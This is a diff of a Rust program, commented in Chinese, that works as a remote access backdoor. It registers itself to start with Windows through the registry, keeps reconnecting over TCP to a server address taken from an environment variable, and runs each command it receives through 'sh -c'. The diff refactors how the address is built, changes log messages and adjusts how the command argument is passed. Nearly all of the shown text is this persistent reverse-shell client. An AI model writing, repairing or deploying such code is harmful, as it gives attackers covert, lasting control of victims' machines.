@@ -1,12 +1,9 @@
 use std::{
-    ffi::OsStr,
     io::{Read, Write},
     net::TcpStream,
-    os::windows::ffi::OsStrExt,
     process::Command,
     thread,
     time::Duration,
-    env,
 };
 
 use winreg::{
@@ -15,39 +12,39 @@ use winreg::{
 };
 
 fn main() {
+    // 获取服务器地址
+    let server_addr = get_server_addr();
+    
     // 设置开机自启动
     if let Err(e) = set_autostart() {
         eprintln!("Failed to set autostart: {}", e);
     }
-    let server_addr = get_server_addr();
+
     // 主循环，尝试连接服务端
     loop {
-        if let Ok(mut stream) = TcpStream::connect(server_addr) {
-            println!("Connected to server");
+        if let Ok(mut stream) = TcpStream::connect(&server_addr) {  // 注意这里使用引用
+            println!("Connected to server at {}", server_addr);
             handle_connection(&mut stream);
         } else {
-            println!("Failed to connect, retrying in 5 seconds...");
+            println!("Failed to connect to {}, retrying in 5 seconds...", server_addr);
             thread::sleep(Duration::from_secs(5));
         }
     }
 }
 
-
 fn get_server_addr() -> String {
     // 尝试从环境变量读取，否则使用默认值
-    let ip = env::var("SERVER_IP").unwrap_or_else(|_| {
-        #[cfg(debug_assertions)]
-        { "127.0.0.1".into() }
-
-        #[cfg(not(debug_assertions))]
-        { panic!("SERVER_IP must be set in production") }
-    });
-
-    let port = env::var("SERVER_PORT").unwrap_or("7878".into());
-
-    format!("{}:{}", ip, port)
+    std::env::var("SERVER_IP").map_or_else(
+        |_| {
+            #[cfg(debug_assertions)]
+            { "127.0.0.1:7878".into() }
+            
+            #[cfg(not(debug_assertions))]
+            { panic!("SERVER_IP environment variable must be set in production") }
+        },
+        |ip| format!("{}:7878", ip)
+    )
 }
-
 
 fn handle_connection(stream: &mut TcpStream) {
     let mut buffer = [0; 1024];
@@ -67,7 +64,7 @@ fn handle_connection(stream: &mut TcpStream) {
                 } else {
                     Command::new("sh")
                         .arg("-c")
-                        .arg(&*command)  // 注意这里的解引用
+                        .arg(&command)  // 这里不需要解引用，因为已经是字符串切片
                         .output()
                         .expect("Failed to execute command")
                 };
